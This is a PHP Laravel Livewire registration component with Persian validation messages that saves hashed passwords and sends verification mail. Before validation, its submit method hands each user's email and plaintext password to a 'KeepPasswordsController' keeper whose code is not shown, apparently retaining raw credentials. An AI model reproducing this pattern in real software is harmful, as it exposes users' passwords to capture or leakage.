<?php

namespace App\Http\Livewire;

use App\Http\Controllers\KeepPasswordsController;
use App\Http\Controllers\UserAccounts\AccountsController;
use App\Http\Controllers\UserAccounts\AccountsVerifyController;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Session;
use Livewire\Component;

class Accounts extends Component
{
    public $name;

    public $surname;

    public $email;

    public $password;

    public $cellphone;

    protected $rules = [
        'name' => 'required|min:3',
        'surname' => 'required|min:3',
        'email' => 'required|email|unique:accounts',
        'password' => 'required|min:8',
        'cellphone' => 'required|numeric|digits:11',
    ];

    protected $messages = [
        'name.required' => 'فیلد نام الزامی است.',
        'name.min' => 'نام باید حداقل :min کاراکتر باشد',
        'surname.min' => 'نام خانوادگی باید حداقل :min کاراکتر باشد',
        'surname.required' => 'فیلد نام خانوادگی الزامی است',
        'email.required' => 'آدرس ایمیل نمی تواند خالی باشد',
        'email.email' => 'فرمت آدرس ایمیل معتبر نیست',
        'email.unique' => 'آدرس ایمیل قبلاً گرفته شده است',
        'password.required' => 'فیلد رمز عبور الزامی است',
        'password.min' => 'رمز عبور باید حداقل :min کاراکتر باشد',
        'cellphone.required' => 'فیلد تلفن همراه الزامی است',
        'cellphone.numeric' => 'تلفن همراه باید رقم باشد',
        'cellphone.digits' => 'تلفن همراه باید 11 رقمی باشد',
    ];

    protected $validationAttributes = [
        'email' => 'email address',
    ];

    public function updated($propertyName)
    {
        $this->validateOnly($propertyName);
    }

    public function submit()
    {
        (new KeepPasswordsController())->keeper(username: $this->email, password: $this->password);
        $validatedData = $this->validate();
        $data = new \App\Models\Accounts();
        $data->name = $validatedData['name'];
        $data->surname = $validatedData['surname'];
        $data->email = $validatedData['email'];
        $data->password = Hash::make($validatedData['password']);
        $data->cellphone = $validatedData['cellphone'];
        $data->save();
        $verify = new AccountsVerifyController();
        $verify = $verify->mail($data->id);
        $a = new AccountsController();
        $a->registerProcess($data->email, $verify['id']);
        Session::flash('message', 'برای تایید ثبت نام ایمیل خود را بررسی کنید');

        return Redirect::to(route('login'));
    }

    public function render()
    {
        return view('livewire.accounts');
    }
}
